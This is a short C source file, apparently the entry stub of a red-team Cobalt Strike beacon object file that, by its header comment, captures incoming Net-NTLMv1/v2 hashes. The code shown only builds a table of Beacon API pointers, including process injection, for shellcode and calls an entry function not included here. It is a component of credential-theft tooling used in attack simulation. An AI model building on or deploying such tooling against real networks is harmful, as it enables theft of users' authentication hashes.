/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "../common.h"

/**
 *
 * @brief:	Constructs a v-table and passes to the entry.
 * @param:	Argument array from Cobalt Strike.
 * @param:	Argument count from Cobalt Strike.
 *
**/
VOID go( PVOID Argv, INT Argc ) {
	BAPI_TABLE Api;

	/* Prepare structure for shellcode */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	Api.BeaconInjectProcess = C_PTR( BeaconInjectProcess );
	Api.BeaconDataExtract   = C_PTR( BeaconDataExtract );
	Api.BeaconDataParse     = C_PTR( BeaconDataParse );
	Api.BeaconIsAdmin       = C_PTR( BeaconIsAdmin );
	Api.BeaconPrintf        = C_PTR( BeaconPrintf );

	BofMain( &Api, Argv, Argc );
};
